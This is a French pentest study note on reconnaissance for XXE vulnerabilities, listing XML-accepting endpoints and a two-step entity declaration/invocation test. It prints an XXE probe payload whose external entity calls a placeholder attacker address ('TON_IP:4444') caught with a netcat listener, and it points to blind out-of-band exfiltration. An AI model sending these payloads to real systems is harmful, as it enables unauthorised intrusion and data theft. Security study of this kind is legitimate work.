---
titre: "XXE — 1 - Repérage"
tags: [Failles, XXE, reconnaissance]
---

# XXE — 1. Repérage

> ⬅ [[XXE - Index]]

## Où chercher
Tout ce qui **envoie du XML au serveur** :
```
- login/API en XML ou SOAP (Content-Type: application/xml, text/xml)
- upload de fichiers XML-based : .xml, .svg, .docx/.xlsx/.pptx, .rss, .xsd, .gpx
- webservices SOAP (voir aussi [[WSDL & SOAP - Index]])
- APIs qui acceptent JSON *et* XML (basculer le Content-Type en application/xml)
```
Astuce : intercepter une requête JSON et tenter de la rejouer en XML
(`Content-Type: application/xml` + corps XML équivalent) — certaines libs acceptent les deux.

## Test de confirmation en 2 temps (le piège)

**Déclarer une entité ≠ l'utiliser.** Un DOCTYPE seul ne fait rien s'il n'est pas invoqué.

### Étape 1 — déclarer une entité externe pointant vers son listener
```xml
<?xml version="1.0"?>
<!DOCTYPE pwn [ <!ENTITY test SYSTEM "http://TON_IP:4444"> ]>
<root><email>test@test.com</email><password>x</password></root>
```
→ rien ne se passe (déclarée mais jamais appelée).

### Étape 2 — invoquer l'entité dans le corps
```xml
<root><email>&test;</email><password>x</password></root>
```
→ le parser résout `&test;` → requête vers `nc -nlvp 4444` = **XXE confirmée**.

> 🧠 À retenir : `<!ENTITY test SYSTEM "...">` = **déclaration** (dans le DOCTYPE) ;
> `&test;` = **invocation** (dans le body). Même logique de "définir vs utiliser"
> que la SSRF.

## Détecter le canal de sortie
- **In-band** : l'app réfléchit un champ (ex. l'email) dans sa réponse/erreur →
  on y verra le fichier lu. Le plus simple.
- **Blind/OOB** : aucune réflexion → confirmer via un hit sur son listener
  (`nc`/Collaborator/interactsh), puis exfiltrer par DTD externe
  (voir [[2 - Exploitation & techniques (XXE)]]).
